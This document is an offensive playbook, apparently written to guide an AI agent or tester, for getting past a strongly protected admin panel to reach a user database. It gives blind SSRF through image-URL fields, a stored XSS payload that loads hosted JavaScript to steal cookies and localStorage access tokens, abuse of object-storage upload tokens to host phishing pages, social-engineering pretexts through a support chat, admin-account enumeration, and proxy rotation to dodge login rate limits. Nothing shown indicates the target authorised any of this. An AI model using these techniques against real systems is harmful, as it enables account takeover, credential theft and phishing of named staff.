# Non-brute pivots when the admin panel is strong

Use when the user DB sits behind an admin panel with an independent strong password (often +2FA) and the
API only serves masked/sampled lists. These pivots spend no dictionary. None of them is a guaranteed win —
plant, verify the primitive, then report honestly whether the trigger fired.

## 1. SSRF through image-URL fields

- Profile/realname submit endpoints take image URLs (`img1`, `img2`, `front_img`). The server fetches them
to validate, appending a probe query (`?imageInfo`). Confirm with a request bin: submit
`http://<webhook>/x` and watch for `GET /x?imageInfo`.
- Usually **blind** (non-image content → `图片无效`); don't expect response reflection. Use it to reach
internal HTTP services, test `file://` / `php://filter` support, and port-scan 127.0.0.1 by timing/error
differential. A blind hit on the admin vhost does not read the panel.
- A valid image (1×1 PNG) plus a generated valid 18-digit ID passes validation. Chinese ID checksum:
weights `[7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2]`, check codes `10X98765432`.

## 2. Stored XSS in operator audit queues

- Admins review realname and subsidy applications; those detail pages render user-supplied fields.
- **Column-length oracle**: over-long text returns the raw SQL error `Data too long for column 'realname'` —
use it to learn which field is long enough for a payload. `realname` is often varchar(20) (too short for an
external `<script src=...>`); `delivery_address`, `family_address`, `payee_name`, `bank_name` are longer and
appear in the audit detail.
- Host the JS on the **target's own object-storage domain** when an upload token is available (HTTPS +
trusted origin, no mixed content):
`<img src=x onerror="s=document.createElement('script');s.src='https://<bucket-domain>/j.js';document.body.append(s)">`.
`j.js` exfiltrates `document.cookie` + `localStorage` (layuiAdmin keeps `access_token` in localStorage; the
session cookie is often HttpOnly).
- Plant in every reviewed long field and poll the request bin. No callback = not fired; the panel may escape
output. Never claim the XSS fired from a successful submit alone.
- A prior tester's `x.js` already on the bucket signals the vector is known — don't reuse their exfil endpoint.

## 3. Object-storage upload-token abuse

- `upToken` replies are `AK:sign:base64url(policy)`. Decode the policy: `scope` = `bucket` (bucket-wide, no
key restriction) vs `bucket:key`; `deadline` epoch; missing `insertOnly` = overwrite allowed.
- Upload host by region (`upload.qiniup.com`, `upload-z0/-z2.qiniup.com`); wrong region returns
`incorrect region`. The public-read CDN domain serves the file with `text/html` / `application/javascript`.
- Bucket-wide write lets you host phishing pages / XSS JS on the target's own domain and overwrite existing
objects. Overwriting victim data (ID-card images, app bundles) is destructive — don't.

## 4. Customer-service (kefu) visitor API

- Widget JS exposes `POST /api/v1/clients/init` with `{"host": window.location.host, "track_id": ...}`.
The `host` must be the widget's **own** host (`ip:port`), not the customer site's domain — anything else
returns `Host not found`.
- Response gives `track_id` + `inbox_id`; then `POST /api/v1/clients/{track_id}/messages` sends and
`GET .../messages` reads (agent name/id, conversation id). No agent panel or conversation IDOR found —
`/conversations/{id}`, `/agents/{id}` are 404.
- Useful for social engineering (the agent is a named human, often asks for a screenshot — a natural pretext
to deliver a link), not for the DB.

## 5. Admin panel entrance and gating

- `X-Forwarded-Host` on the API origin leaks the production admin vhost (302 Location). The app may build
the redirect as `<random-prefix>.<XFH>` — only the correct XFH yields the real host.
- Accounts are pinyin of officials; confirm existence via `账号不存在` vs `密码错误`. Login is typically
~4-5 attempts/10 min **per IP** (proxies rotate it); some accounts carry 2FA: `res.data.isValid==0` →
dashboard, else `/Common/secondaryValidation.html`.
- `/index.php/<Controller>/<method>` reaches controllers that nginx `location /admin/ { deny all; }` blocks,
but the app's session check still applies — routing bypass, not auth bypass.

## 6. Egress budgeting

- Never pre-test candidate proxies against the target's login route: the test itself consumes the per-IP
attempt budget and every later "wrong password" is really a lockout. Test against `api.ipify.org`.
- Free SOCKS lists are mostly dead; measure the alive rate before a campaign. Round-robin with a cooldown
set beats random choice, which burns a few IPs and leaves the rest idle.
